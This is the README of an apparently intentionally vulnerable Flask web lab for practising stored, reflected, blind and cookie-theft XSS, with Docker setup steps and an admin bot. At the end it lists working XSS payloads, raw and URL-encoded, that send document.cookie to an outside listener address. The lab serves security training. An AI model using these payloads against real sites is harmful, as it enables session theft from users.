# XSSLabs: Intentionally Vulnerable XSS Lab

This project is an intentionally vulnerable web application designed to demonstrate and practice various types of Cross-Site Scripting (XSS) vulnerabilities, including:

- **Stored XSS**
- **Reflected XSS**
- **Blind XSS** (with detection)
- **Advanced XSS**: Cookie theft via admin bot

## Structure
- **web**: Flask-based vulnerable web app
- **bot**: Admin bot (headless browser) that visits user-supplied pages with an admin cookie

## Running the Lab

1. **Install Docker and Docker Compose**
2. **Start the lab:**
   ```sh
   docker-compose up --build
   ```
3. Access the web app at [http://localhost:5000](http://localhost:5000)

## For Developers
- The app is intentionally insecure. Do NOT deploy in production.
- Contributions welcome! 


Blind Payload:
new Image().src='http://10.0.2.15:8000?c='+document.cookie 


WhenToolsFail1:
<img src=x onerror="new Image().src='http://10.0.2.15:8000?c='+document.cookie">
you have to URL encode it

%3Cimg%20src%3Dx%20onerror%3D%22new%20Image().src%3D'http%3A%2F%2F10.0.2.15%3A8000%3Fc%3D'%2Bdocument.cookie%22%3E
